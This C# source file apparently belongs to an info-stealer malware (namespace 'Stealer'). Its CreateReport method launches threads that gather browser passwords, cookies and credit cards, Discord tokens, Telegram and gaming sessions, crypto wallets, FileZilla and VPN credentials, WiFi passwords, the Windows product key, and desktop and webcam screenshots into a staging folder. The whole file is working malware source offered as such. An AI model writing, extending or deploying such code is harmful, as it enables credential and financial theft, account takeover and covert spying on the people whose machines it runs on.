using System;
using System.IO;
using System.Threading;
using System.Collections.Generic;

namespace Stealer
{
    internal sealed class Report
    {
        public static bool CreateReport(string sSavePath)
        {
            // List with threads
            List <Thread> Threads = new List<Thread>();

            try
            {
                // Collect files
                Threads.Add(new Thread(() =>
                    FileGrabber.Run(sSavePath + "\\Grabber")
                ));

                // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                Threads.Add(new Thread(() =>
                {
                    Chromium.Recovery.Run(sSavePath + "\\Browsers");
                    Edge.Recovery.Run(sSavePath + "\\Browsers");
                }));
                // Firefox thread (logins.json, db files, cookies, history, bookmarks)
                Threads.Add(new Thread(() =>
                    Firefox.Recovery.Run(sSavePath + "\\Browsers")
                ));
                // Internet explorer thread (logins)
                Threads.Add(new Thread(() => { 
                    try
                    {
                        InternetExplorer.Recovery.Run(sSavePath + "\\Browsers");
                    }
                    catch { }
                }));

                // Write discord tokens
                Threads.Add(new Thread(() =>
                    Discord.WriteDiscord(
                        Discord.GetTokens(),
                        sSavePath + "\\Messenger\\Discord")
                ));

                // Write pidgin accounts
                Threads.Add(new Thread(() =>
                    Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin")
                ));

                // Write telegram session
                Threads.Add(new Thread(() =>
                    Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
                ));

                // Steam & Uplay sessions collection
                Threads.Add(new Thread(() =>
                {
                    // Write steam session
                    Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
                    // Write uplay session
                    Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
                }));

                // Minecraft collection
                Threads.Add(new Thread(() =>
                    Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft")
                ));

                // Write wallets
                Threads.Add(new Thread(() =>
                    Wallets.GetWallets(sSavePath + "\\Wallets")
                ));

                // Write FileZilla
                Threads.Add(new Thread(() =>
                    FileZilla.WritePasswords(FileZilla.Steal(), sSavePath + "\\FileZilla")
                ));

                // Write VPNs
                Threads.Add(new Thread(() =>
                {
                    ProtonVPN.Save(sSavePath + "\\VPN\\ProtonVPN");
                    OpenVPN.Save(sSavePath + "\\VPN\\OpenVPN");
                    NordVPN.Save(sSavePath + "\\VPN\\NordVPN");
                }));

                // Get directories list
                Threads.Add(new Thread(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));

                // Create directory to save system information
                Directory.CreateDirectory(sSavePath + "\\System");

                // Process list & active windows list
                Threads.Add(new Thread(() =>
                {
                    // Write process list
                    ProcessList.WriteProcesses(sSavePath + "\\System");
                    // Write active windows titles
                    ActiveWindows.WriteWindows(sSavePath + "\\System");
                }));

                // Desktop & Webcam screenshot
                Thread dwThread = new Thread(() =>
                {
                    // Create dekstop screenshot
                    DesktopScreenshot.Make(sSavePath + "\\System");
                    // Create webcam screenshot
                    WebcamScreenshot.Make(sSavePath + "\\System");
                });
                dwThread.SetApartmentState(ApartmentState.STA);
                Threads.Add(dwThread);

                // Saved wifi passwords
                Threads.Add(new Thread(() =>
                {
                    // Fetch WiFi passwords
                    Wifi.SavedNetworks(sSavePath + "\\System");
                    // Fetch all WiFi networks with BSSID
                    Wifi.ScanningNetworks(sSavePath + "\\System");
                }
                ));;
                // Windows product key
                Threads.Add(new Thread(() =>
                    // Write product key
                    File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                        ProductKey.GetWindowsProductKeyFromRegistry())
                ));

                // Start all threads
                foreach (Thread t in Threads)
                    t.Start();

                // Wait all threads
                foreach (Thread t in Threads)
                    t.Join();

                return true;
            }
            catch (Exception ex) {
                Console.WriteLine(ex);
                return false; 
            }
        }
    }
}
